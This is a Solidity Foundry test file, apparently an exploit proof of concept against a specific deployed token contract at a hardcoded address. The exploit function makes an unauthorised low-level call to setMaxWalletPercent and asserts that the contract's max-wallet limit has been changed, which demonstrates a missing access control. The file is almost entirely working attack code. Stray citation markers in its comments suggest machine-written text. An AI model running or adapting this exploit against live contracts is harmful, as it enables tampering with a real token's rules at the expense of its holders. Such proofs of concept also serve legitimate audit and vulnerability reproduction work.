pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @dev It's necessary to define an interface to interact with the target contract.
 * This interface includes the public state variable's getter function.
 * For any public state variable, Solidity automatically creates a getter function with the same name. [1, 3, 4]
 */
interface ITarget {
    function _maxWalletToken() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    // The target contract is instantiated using its address and the interface. [2, 5]
    ITarget constant TARGET = ITarget(0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7);
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No setup needed as the exploit uses a low-level call.
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        (bool success, ) = address(TARGET).call(abi.encodeWithSignature("setMaxWalletPercent(uint256)", 100));
        require(success, "low-level call failed");

        /**
         * The original code failed because `_maxWalletToken` was not declared.
         * By using the interface, we can now call the getter function to retrieve the state from the TARGET contract. [5]
         */
        assertEq(TARGET._maxWalletToken(), 1000000000000000000, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
